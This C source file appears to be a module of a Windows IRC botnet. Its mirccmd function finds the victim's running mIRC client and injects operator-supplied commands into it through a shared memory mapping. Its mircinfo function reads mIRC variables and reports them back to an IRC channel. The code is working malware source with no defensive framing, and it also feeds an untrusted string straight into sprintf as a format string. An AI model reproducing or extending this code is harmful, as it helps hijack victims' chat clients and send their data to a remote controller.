#include "includes.h"
#include "functions.h"
#include "externs.h"

bool mirccmd(char *cmd) {
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return true;
	} else
		return false;
}

//one parameter function
void mircinfo(char *variable, SOCKET sock, char *chan, bool notice, bool silent) {
	char buffer[IRCLINE];
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
			
		sprintf(mData,"%s", variable);
		fSendMessage(mwnd,WM_USER + 201,1,0);

		_snprintf(buffer,sizeof(buffer), "[mIRC]: %s: %s", variable, ((mData)?(mData):("[null]")));

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
	} else 
		_snprintf(buffer,sizeof(buffer), "[mIRC]: Window not found.");
	if (!silent) irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);
 }